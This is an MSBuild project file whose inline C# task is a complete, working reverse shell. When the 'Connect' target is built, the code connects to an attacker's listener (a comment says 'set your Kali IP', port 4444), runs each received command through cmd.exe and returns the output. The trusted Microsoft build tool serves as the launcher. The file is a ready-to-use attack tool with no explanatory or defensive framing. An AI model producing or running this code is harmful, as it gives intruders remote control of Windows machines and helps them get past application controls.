<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <!-- Define the UsingTask first so MSBuild recognizes it -->
  <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory"
             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs"><![CDATA[
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
using System.IO;
using System.Threading;

public class ReverseShell : Microsoft.Build.Utilities.Task {
    public override bool Execute() {
        try {
            StartShell(); // block here so MSBuild waits
        } catch (Exception ex) {
            SafeLog("Execute exception: " + ex.ToString());
        }
        return true;
    }

    private void StartShell() {
        string host = "192.168.1.8"; // <-- set your Kali IP
        int port = 4444;             // <-- set your listener port

        try {
            using (TcpClient client = new TcpClient()) {
                client.Connect(host, port);
                using (NetworkStream stream = client.GetStream()) {
                    stream.ReadTimeout = 0;
                    stream.WriteTimeout = 0;

                    WriteToStream(stream, "=== MSBuild Reverse Shell Connected ===\r\n");

                    while (client.Connected) {
                        // Prompt
                        string prompt = "PS " + Directory.GetCurrentDirectory() + "> ";
                        WriteToStream(stream, prompt);

                        // Read command (blocking)
                        byte[] buffer = new byte[8192];
                        int bytesRead = 0;
                        try {
                            bytesRead = stream.Read(buffer, 0, buffer.Length);
                        } catch (IOException) {
                            Thread.Sleep(100);
                            continue;
                        }

                        if (bytesRead <= 0) break;

                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).TrimEnd('\0', '\r', '\n');
                        if (string.IsNullOrWhiteSpace(command)) continue;
                        if (command.Equals("exit", StringComparison.OrdinalIgnoreCase)) break;

                        string result = ExecuteCommand(command);
                        WriteToStream(stream, result);
                    }
                }
            }
        } catch (Exception ex) {
            SafeLog("StartShell exception: " + ex.ToString());
        }
    }

    private void WriteToStream(NetworkStream stream, string text) {
        try {
            byte[] bytes = Encoding.UTF8.GetBytes(text);
            stream.Write(bytes, 0, bytes.Length);
            stream.Flush();
        } catch (Exception ex) {
            SafeLog("WriteToStream exception: " + ex.ToString());
        }
    }

    private string ExecuteCommand(string command) {
        try {
            using (Process process = new Process()) {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(error)) {
                    output += Environment.NewLine + error;
                }

                return output + "\r\n";
            }
        } catch (Exception ex) {
            return "ExecuteCommand error: " + ex.Message + "\r\n";
        }
    }

    private void SafeLog(string text) {
        try {
            string path = Path.Combine(Path.GetTempPath(), "msbuild_revshell.log");
            File.AppendAllText(path, DateTime.UtcNow.ToString("o") + " " + text + Environment.NewLine);
        } catch { }
    }
}
      ]]></Code>
    </Task>
  </UsingTask>

  <!-- Targets come after UsingTask -->
  <Target Name="Connect">
    <ReverseShell />
  </Target>

</Project>
